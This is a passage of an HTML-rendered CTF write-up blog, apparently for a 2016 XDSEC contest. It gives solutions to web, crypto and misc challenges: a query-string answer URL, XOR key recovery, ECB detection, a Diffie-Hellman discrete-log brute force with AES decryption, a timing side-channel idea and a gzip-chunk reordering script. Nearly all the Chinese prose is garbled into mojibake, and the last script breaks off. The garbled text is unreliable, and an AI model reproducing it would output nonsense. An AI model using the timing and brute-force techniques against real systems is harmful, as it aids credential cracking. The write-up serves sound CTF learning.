wrong&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;payload is right&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ç–¯ç‹‚çš„JS-300"><a href="#ç–¯ç‹‚çš„JS-300" class="headerlink" title="ç–¯ç‹‚çš„JS(300)"></a>ç–¯ç‹‚çš„JS(300)</h2><blockquote><p>ç–¯ç‹‚çš„jsï¼Œè€å¸ˆç»™æˆ‘å¸ƒç½®äº†ä¸€é“jsé¢˜ï¼Œä½œä¸ºjså°ç™½çš„æˆ‘åšä¸åˆ°å•Šï¼Œå¤§å®¶å¸®å¿™çœ‹çœ‹å§~</p></blockquote><p>è¿™ä¸ªä¹Ÿæ˜¯æ²¡åšå‡ºæ¥çš„<br><strong>é¢˜åœ¨å‡ºé¢˜è¿‡ç¨‹ä¸­å¯èƒ½å€Ÿé‰´äº†</strong> <a href="https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/halphow2js">è¿™é‡Œ</a><br>payloadï¼š<a href="http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762">http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ç´§æ€¥æŠ¥æ–‡"><a href="#ç´§æ€¥æŠ¥æ–‡" class="headerlink" title="ç´§æ€¥æŠ¥æ–‡"></a>ç´§æ€¥æŠ¥æ–‡</h2><blockquote><p>è§£å¯†ä¸€ä¸‹è¿™ä»½æˆªè·çš„å¯†æ–‡å§ï¼Œæ—¶é—´å°±æ˜¯æœºä¼šï¼<br>FA XX DD AG FF XG FD XG DD DG GA XF FA</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20"></a></p><h2 id="is-it-x-or-z"><a href="#is-it-x-or-z" class="headerlink" title="is it x or z ?"></a>is it x or z ?</h2><blockquote><p>is it x or z ?<br>100<br>ä½ å¯ä»¥è§£å¯†è¿™äº›æ®‹æŸçš„æ–‡ä»¶å—ï¼Ÿ</p></blockquote><p>æ˜æ–‡1å’Œå¯†æ–‡1å¼‚æˆ–å¾—åˆ°key<br>å¯†æ–‡2çš„keyä»æœ€åä¸ªå­—æ¯få¼€å§‹å¾ªç¯<br>å¼‚æˆ–å¾—åˆ°æ˜æ–‡2</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20"></a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-  </span></span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">import</span> struct   </span><br><span class="line">  </span><br><span class="line"><span class="comment">#æ¯ä¸ªå­—èŠ‚è½¬æˆhexï¼Œ0xé¡ºä¾¿å»æ‰ï¼Œå¯¹äºä¸è¶³ä¸¤ä½çš„è¡¥0  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">str</span>):</span>  </span><br><span class="line">    hexs = []  </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str:  </span><br><span class="line">        tmp = (hex(ord(s)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))  </span><br><span class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">2</span>:  </span><br><span class="line">            hexs.append(tmp)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            hexs.append(<span class="string">&#x27;0&#x27;</span>+tmp)  </span><br><span class="line">    <span class="keyword">return</span> hexs  </span><br><span class="line">  </span><br><span class="line">arr  = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]  </span><br><span class="line">arr2 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran</span>(<span class="params">r</span>):</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):  </span><br><span class="line">        <span class="keyword">if</span> r == arr[i]:  </span><br><span class="line">            <span class="keyword">return</span> arr2[i]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">          </span><br><span class="line">f = open(<span class="string">&#x27;crypt-2.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  </span><br><span class="line">f2 = open(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  </span><br><span class="line">hexs = []  </span><br><span class="line">hexs2 = []  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:   </span><br><span class="line">    t = f.readline()  </span><br><span class="line">    t2 = f2.readline()  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t <span class="keyword">or</span> <span class="keyword">not</span> t2:  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    hexs.extend(str2hex(t))  </span><br><span class="line">    hexs2.extend(str2hex(t2))  </span><br><span class="line">f.close()  </span><br><span class="line">f2.close()  </span><br><span class="line">  </span><br><span class="line">ff = open(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(min(len(hexs),len(hexs2))):  </span><br><span class="line">    a = tran(hexs[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs[i][<span class="number">1</span>])  </span><br><span class="line">    b = tran(hexs2[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs2[i][<span class="number">1</span>])  </span><br><span class="line">    B = struct.pack(<span class="string">&#x27;B&#x27;</span>,a^b)  </span><br><span class="line">    ff.write(B)      </span><br><span class="line">ff.close()  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ†ç»„åŠ å¯†æ£€æµ‹-150"><a href="#åˆ†ç»„åŠ å¯†æ£€æµ‹-150" class="headerlink" title="åˆ†ç»„åŠ å¯†æ£€æµ‹(150)"></a>åˆ†ç»„åŠ å¯†æ£€æµ‹(150)</h2><blockquote><p>åˆ†ç»„åŠ å¯†æ¨¡å¼æ£€æµ‹</p></blockquote><p>æ–‡ä»¶ï¼ˆchallenge.txtï¼‰åŒ…å«base64ç¼–ç åçš„å¯†æ–‡ï¼Œå…¶ä¸­æŸæ®µå¯†æ–‡é‡‡ç”¨çš„åŠ å¯†æ¨¡å¼ä¸å¤ªä¸€æ ·ï¼Œè¯·æ‰¾å‡ºï¼Œå¹¶ä»¥è¯¥æ®µå¯†æ–‡base64è§£ç åçš„å‰16ä¸ªå­—ç¬¦ä½œä¸ºflagæäº¤ã€‚</p><p>å…ˆå…¨éƒ¨base64è§£ç  ç„¶åå†å»æ£€æµ‹<br><a href="https://github.com/truongkma/ctf-tools/tree/master/cryptopals-solutions-master/set1/8">Github</a>ä¸Šé¢æœ‰é¡¹ç›® ä¸‹è½½ä¸‹æ¥è·‘ä¸€ä¸‹å°±æ˜¯äº† </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20"></a></p><h2 id="ä¿®å¤ä¸€ä¸‹è¿™ä»½é‚€è¯·å‡½éƒ¨åˆ†å†…å®¹-200"><a href="#ä¿®å¤ä¸€ä¸‹è¿™ä»½é‚€è¯·å‡½éƒ¨åˆ†å†…å®¹-200" class="headerlink" title="ä¿®å¤ä¸€ä¸‹è¿™ä»½é‚€è¯·å‡½éƒ¨åˆ†å†…å®¹(200)"></a>ä¿®å¤ä¸€ä¸‹è¿™ä»½é‚€è¯·å‡½éƒ¨åˆ†å†…å®¹(200)</h2><blockquote><p>ä¿®å¤ä¸€ä¸‹è¿™ä»½é‚€è¯·å‡½çš„éƒ¨åˆ†å†…å®¹</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20"></a></p><p>çº¢è‰²éƒ¨åˆ†å°±æ˜¯flag äº†</p><h2 id="æ—¶é—´å†³å®šä¸€åˆ‡-350"><a href="#æ—¶é—´å†³å®šä¸€åˆ‡-350" class="headerlink" title="æ—¶é—´å†³å®šä¸€åˆ‡(350)"></a>æ—¶é—´å†³å®šä¸€åˆ‡(350)</h2><blockquote><p>æ—¶é—´å†³å®šä¸€åˆ‡</p></blockquote><p>è€ƒéªŒå¤§å®¶äººå“çš„æ—¶å€™åˆ°å•¦ï¼ï¼ï¼<br><a href="http://huashan.xdsec.cn/mima/">http://huashan.xdsec.cn/mima/</a></p><p>åˆ©ç”¨â€œphpå¾ˆçƒ¦äººâ€é‚£é¢˜å¾—åˆ°index.phpæºç ï¼Œflagå°±åœ¨å…¶ä¸­</p><p>æ­£ç¡®è§£æ³•ï¼š<br><a href=""></a></p><p><a href="https://github.com/SpiderLabs/CryptOMG/blob/master/ctf/challenge3/index.php">å‚è€ƒé“¾æ¥</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo gjVGaqJZOnjm54LirXgElRIAOnb8oVEWfkj&#x2F;7medMRU&#x3D; | base64 -d | xxd</span><br><span class="line">00000000: 8235 466a a259 3a78 e6e7 82e2 ad78 0495  .5Fj.Y:x.....x..</span><br><span class="line">00000010: 1200 3a76 fca1 5116 7e48 ffee 679d 3115  ..:v..Q.~H..g.1.</span><br></pre></td></tr></table></figure><p>ä»ä¾§ä¿¡é“æ”»å‡»çš„è§’åº¦è€ƒè™‘ï¼Œæˆ‘ä»¬å¯ä»¥ä¾æ¬¡æ¯”è¾ƒæ¯ä¸ªå­—ç¬¦ï¼Œå¯¹äºä¸åŒçš„è¾“å…¥æ•°æ®ï¼Œæ‰§è¡Œ10000æ¬¡æ“ä½œï¼Œè€—è´¹çš„æ—¶é—´æ˜¯ä¸åŒçš„ï¼Œè¿™æ ·é€ä¸ªå­—ç¬¦ç ´è§£ï¼Œå°±å¯ä»¥å¾—åˆ°ç›®æ ‡å€¼ã€‚</p><h2 id="åè®®ï¼Ÿè®¤è¯ï¼ŸåŠ å¯†ï¼Ÿ-300"><a href="#åè®®ï¼Ÿè®¤è¯ï¼ŸåŠ å¯†ï¼Ÿ-300" class="headerlink" title="åè®®ï¼Ÿè®¤è¯ï¼ŸåŠ å¯†ï¼Ÿ(300)"></a>åè®®ï¼Ÿè®¤è¯ï¼ŸåŠ å¯†ï¼Ÿ(300)</h2><blockquote><p>åè®®ï¼Ÿè®¤è¯ï¼ŸåŠ å¯†ï¼Ÿ</p></blockquote><p>å®‰å…¨ä¹Ÿéœ€è¦èåˆï¼</p><p>æ›´æ–°äº†ä¸€ä¸‹ä»£ç </p><p>é¡ºä¾¿åšä¸ªåˆ†æ</p><p>åœ¨æµé‡åŒ…é‡Œé¢èƒ½æ‰¾åˆ°å…³é”®ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">T connection 0.0.0.0:12345 at Fri Sep 09 13:14:22 2016 succeed!</span><br><span class="line">R OK</span><br><span class="line">T Welcome to the Humen DH-AES Key eXchange System!</span><br><span class="line">R OK</span><br><span class="line">T g:7</span><br><span class="line">R OK</span><br><span class="line">T p:1023789085312022807</span><br><span class="line">R OK</span><br><span class="line">T A:651518302569801068</span><br><span class="line">R OK</span><br><span class="line">T Give your Para-B?</span><br><span class="line">R 310117834581236149</span><br><span class="line">T</span><br><span class="line">Secrct data!</span><br><span class="line">&#x2F;ReO]]0000   53 65 63 ** ** ** ** 64 61 74 61 21 0a 2f a0 c7  Secrct data!.&#x2F;..</span><br><span class="line">0010   a1 0e 0d 87 a5 8f 52 bd dd d4 65 d0 b0 8e 4f ba  ......R...e...O.</span><br><span class="line">0020   da ba e6 93 90 fc d7 c2 5d 91 5d fa d1           ........].]..</span><br></pre></td></tr></table></figure><p><strong>DH-AES</strong>è§„åˆ™<br>å…ˆå®špå’Œg  ç„¶ååŒæ–¹éšæœº aå’Œb<br>è®¡ç®—å‡ºAå’ŒBä¼ ç»™å¯¹æ–¹ã€‚åŒæ–¹è¿›è¡Œè¿ç®—<br>(g^b%p)   (g^a%p)åˆ†åˆ«æ˜¯B ï¼ŒA</p><p>(g^b%p)^a%p=(g^a%p)^b%p</p><p>B^a%p=A^b%p   â€”â€”â€”â€”å°±æ˜¯Key<br>å…¶ä¸­çš„g pæ˜¯å…¬å¼€çš„ã€‚a,bæ˜¯ç§å¯†çš„ã€‚<br>è¿™æ ·å°±èƒ½è¿›è¡ŒåŠ å¯†è¿ç®—äº† æ‰€ä»¥æˆ‘ä»¬è¦è§£å¯†ä¹Ÿæ˜¯éœ€è¦çŸ¥é“keyçš„<br>æ‰€ä»¥åªè¦å¾—åˆ°** pow(B,a,p)** æˆ–è€…  **pow(A,b,p) **</p><p>æ€»ç»“ä¸€ä¸‹<br>Aé€‰æ‹©ä¸€ä¸ªéšæœºæ•°c,(0&lt;c&lt;p)ï¼Œå‘é€g<strong>c mod pç»™Bï¼Œä½œä¸ºå…¬é’¥ï¼›å°†cå¦¥å–„ä¿ç®¡ä½œä¸ºç§é’¥<br>Bé€‰æ‹©ä¸€ä¸ªéšæœºæ•°d,(0&lt;d&lt;p)ï¼Œå‘é€g</strong>d mod pç»™Aï¼Œä½œä¸ºå…¬é’¥ï¼›å°†då¦¥å–„ä¿ç®¡ä½œä¸ºç§é’¥<br>æ­¤æ—¶Aã€BåŒæ–¹éƒ½èƒ½è®¡ç®—K=(g<strong>c mod p)**d=(g</strong>d mod p)<strong>c=(g</strong>cd mod p)ï¼Œå³Kå³ä¸ºAã€Bä¹‹é—´çš„å¯†é’¥</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="number">274389752</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">651518302569801068</span></span><br><span class="line"></span><br><span class="line">B = <span class="number">310117834581236149</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1023789085312022807</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># açš„è®¡ç®—  è¿™é‡Œè€ƒçš„æ˜¯ç¦»æ•£å¯¹æ•°</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">myA = <span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> myA != A:</span><br><span class="line">    myA = myA*<span class="number">7</span> % p</span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line"><span class="comment"># a = 274389752</span></span><br><span class="line"><span class="comment"># è®¡ç®—æ˜æ–‡</span></span><br><span class="line">key = pow(B,a,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(key)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;0bb82841e54d05dd&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = hashlib.md5(key).digest()</span></span><br><span class="line">cipher = AES.new(key,AES.MODE_CBC,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;2fa0c7a10e0d87a58f52bdddd465d0b08e4fbadabae69390fcd7c25d915dfad1&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> cipher.decrypt(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Try-Everything-200"><a href="#Try-Everything-200" class="headerlink" title="Try Everything(200)"></a>Try Everything(200)</h2><blockquote><p>Try Everything  try everything you can to get flag, and DO NOT ASK MANAGER THE FLAG.</p></blockquote><p>è¿™é¢˜çš„fileè‹¥æ˜¯ç›´æ¥è§£å‹çš„è¯ï¼Œå¾—åˆ°çš„å†…å®¹æ˜¯ä¹±åºçš„ï¼Œä½†æ˜¯ä»”ç»†ä¸€çœ‹flagå½¢å¼çš„å­—æ ·éƒ½æœ‰ï¼Œäºæ˜¯å…³é”®æ˜¯å¦‚ä½•è°ƒæ•´é¡ºåºï¼Œè¿™é‡Œå€Ÿç”¨binwalk</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20"></a></p><p>å¾—åˆ°æ–‡ä»¶çš„åç§»é‡<br>é‡Œé¢æ–‡ä»¶æ¯ä¸ªåœ°å€å¯¹åº”äº†ä¸åŒçš„æ–‡ä»¶åï¼ˆåºå·è¿˜ä¸åŒï¼‰ï¼Œæ‰€ä»¥åªè¦æŠŠé‡Œé¢çš„offsetæ•´ç†å¥½ï¼Œç„¶åå†™ä¸ªè„šæœ¬åˆ†ç¦»æºæ–‡ä»¶åˆ°å„ä¸ªå°æ–‡ä»¶ï¼Œç„¶åè§£å‹ï¼Œå†æŒ‰æ•°å­—æ¥æ’åºå°±å¯ä»¥ã€‚<br>ä»¥ä¸‹è„šæœ¬åŸºäºè‡ªå·±å…ˆæ•´ç†å‡ºäº†offsetï¼Œä»¥åŠå»ºç«‹äº†ä¸€ä¸ªoutæ–‡ä»¶å¤¹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">f_all=open(<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment">#print len(f_all)</span></span><br><span class="line">l1=[<span class="number">0</span>   , <span class="number">24</span>  , <span class="number">48</span>  , <span class="number">73</span>  , <span class="number">98</span>  , <span class="number">122</span> , <span class="number">146</span> , <span class="number">170</span> , <span class="number">195</span> , <span class="number">220</span> , <span class="number">245</span> , <span class="number">270</span> , <span class="number">295</span> , <span class="number">319</span> , <span class="number">344</span> , <span class="number">368</span> , <span class="number">393</span> , <span class="number">418</span> , <span class="number">443</span> , <span class="number">467</span> , <span class="number">491</span> , <span class="number">515</span> , <span class="number">539</span> , <span class="number">562</span> , <span class="number">586</span> , <span class="number">611</span> , <span class="number">635</span> , <span class="number">659</span> , <span class="number">683</span> , <span class="number">708</span> , <span class="number">732</span> , <span class="number">756</span> , <span class="number">781</span> , <span class="number">806</span> , <span class="number">829</span> , <span class="number">853</span> , <span class="number">877</span> , <span class="number">901</span> , <span class="number">925</span> , <span class="number">950</span> , <span class="number">975</span> , <span class="number">999</span> , <span class="number">1024</span>, <span class="number">1048</span>, <span class="number">1071</span>, <span class="number">1095</span>, <span class="number">1120</span>, <span class="number">1144</span>, <span class="number">1168</span>, <span class="number">1192</span>, <span class="number">1216</span>, <span class="number">1241</span>, <span class="number">1265</span>, <span class="number">1290</span>, <span class="number">1315</span>, <span class="number">1340</span>, <span class="number">1364</span>, <span class="number">1389</span>, <span class="number">1412</span>, <span class="number">1436</span>, <span class="number">1460</span>, <span class="number">1484</span>, <span class="number">1508</span>, <span class="number">1533</span>, <span class="number">1557</span>, <span class="number">1582</span>, <span class="number">1607</span>, <span class="number">1631</span>, <span class="number">1656</span>, <span class="number">1681</span>, <span class="number">1705</span>, <span class="number">1729</span>, <span class="number">1753</span>, <span class="number">1777</span>, <span class="number">1802</span>, <span class="number">1825</span>, <span class="number">1849</span>, <span class="number">1873</span>, <span class="number">1898</span>, <span class="number">1923</span>, <span class="number">1947</span>, <span class="number">1971</span>, <span class="number">1995</span>, <span class="number">2020</span>, <span class="number">2044</span>, <span class="number">2069</span>, <span class="number">2094</span>, <span class="number">2118</span>, <span class="number">2143</span>, <span class="number">2167</span>, <span class="number">2191</span>, <span class="number">2215</span>, <span class="number">2239</span>, <span class="number">2264</span>, <span class="number">2288</span>, <span class="number">2313</span>, <span class="number">2338</span>, <span class="number">2363</span>, <span class="number">2387</span>, <span class="number">2412</span>, <span class="number">2437</span>, <span class="number">2462</span>, <span class="number">2486</span>, <span class="number">2511</span>, <span class="number">2536</span>, <span class="number">2560</span>, <span class="number">2584</span>, <span class="number">2609</span>, <span class="number">2634</span>, <span class="number">2658</span>, <span class="number">2682</span>, <span class="number">2707</span>, <span class="number">2731</span>, <span class="number">2755</span>, <span class="number">2780</span>, <span class="number">2805</span>, <span class="number">2829</span>, <span class="number">2854</span>, <span class="number">2878</span>, <span class="number">2902</span>, <span class="number">2926</span>, <span class="number">2950</span>, <span class="number">2974</span>, <span class="number">2998</span>, <span class="number">3022</span>, <span class="number">3046</span>, <span class="number">3071</span>, <span class="number">3096</span>, <span class="number">3120</span>, <span class="number">3145</span>, <span class="number">3170</span>, <span class="number">3195</span>, <span class="number">3220</span>, <span class="number">3245</span>, <span class="number">3269</span>, <span class="number">3293</span>, <span class="number">3316</span>, <span class="number">3340</span>, <span class="number">3364</span>, <span class="number">3389</span>, <span class="number">3413</span>, <span class="number">3437</span>, <span class="number">3462</span>, <span class="number">3486</span>, <span class="number">3511</span>, <span class="number">3534</span>, <span class="number">3559</span>, <span class="number">3583</span>, <span class="number">3607</span>, <span class="number">3631</span>, <span class="number">3655</span>, <span class="number">3679</span>, <span class="number">3704</span>, <span class="number">3727</span>, <span class="number">3751</span>, <span class="number">3774</span>, <span class="number">3798</span>, <span class="number">3822</span>, <span class="number">3847</span>, <span class="number">3870</span>, <span class="number">3894</span>, <span class="number">3918</span>, <span class="number">3942</span>, <span class="number">3966</span>, <span class="number">3990</span>] <span class="comment">#æœ€åä¸€ä¸ªæ˜¯len(f_all)</span></span><br><span class="line">l2=[<span class="number">24</span>,<span class="number">72</span>,<span class="number">108</span>,<span class="number">129</span>,<span class="number">18</span>,<span class="number">92</span>,<span class="number">63</span>,<span class="number">162</span>,<span class="number">110</span>,<span class="number">156</span>,<span class="number">132</span>,<span class="number">101</span>,<span class="number">34</span>,<span class="number">143</span>,<span class="number">28</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">69</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">127</span>,<span class="number">55</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">149</span>,<span class="number">21</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">142</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">88</span>,<span class="number">133</span>,<span class="number">161</span>,<span class="number">35</span>,<span class="number">137</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">113</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">91</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">19</span>,<span class="number">135</span>,<span class="number">153</span>,<span class="number">105</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">9</span>,<span class="number">68</span>,<span class="number">64</span>,<span class="number">81</span>,<span class="number">93</span>,<span class="number">147</span>,<span class="number">67</span>,<span class="number">138</span>,<span class="number">160</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">154</span>,<span class="number">75</span>,<span class="number">89</span>,<span class="number">66</span>,<span class="number">26</span>,<span class="number">141</span>,<span class="number">2</span>,<span class="number">98</span>,<span class="number">96</span>,<span class="number">124</span>,<span class="number">145</span>,<span class="number">84</span>,<span class="number">71</span>,<span class="number">15</span>,<span class="number">140</span>,<span class="number">90</span>,<span class="number">144</span>,<span class="number">100</span>,<span class="number">61</span>,<span class="number">131</span>,<span class="number">27</span>,<span class="number">23</span>,<span class="number">53</span>,<span class="number">40</span>,<span class="number">130</span>,<span class="number">47</span>,<span class="number">117</span>,<span class="number">148</span>,<span class="number">150</span>,<span class="number">50</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">121</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">45</span>,<span class="number">152</span>,<span class="number">109</span>,<span class="number">62</span>,<span class="number">70</span>,<span class="number">116</span>,<span class="number">77</span>,<span class="number">12</span>,<span class="number">139</span>,<span class="number">155</span>,<span class="number">80</span>,<span class="number">103</span>,<span class="number">13</span>,<span class="number">74</span>,<span class="number">16</span>,<span class="number">51</span>,<span class="number">94</span>,<span class="number">87</span>,<span class="number">97</span>,<span class="number">25</span>,<span class="number">151</span>,<span class="number">128</span>,<span class="number">54</span>,<span class="number">125</span>,<span class="number">112</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">158</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">4</span>,<span class="number">38</span>,<span class="number">79</span>,<span class="number">157</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">134</span>,<span class="number">30</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">104</span>,<span class="number">52</span>,<span class="number">65</span>,<span class="number">44</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">163</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">5</span>,<span class="number">60</span>,<span class="number">59</span>,<span class="number">159</span>,<span class="number">8</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">43</span>,<span class="number">56</span>,<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">fname_list=[]</span><br><span 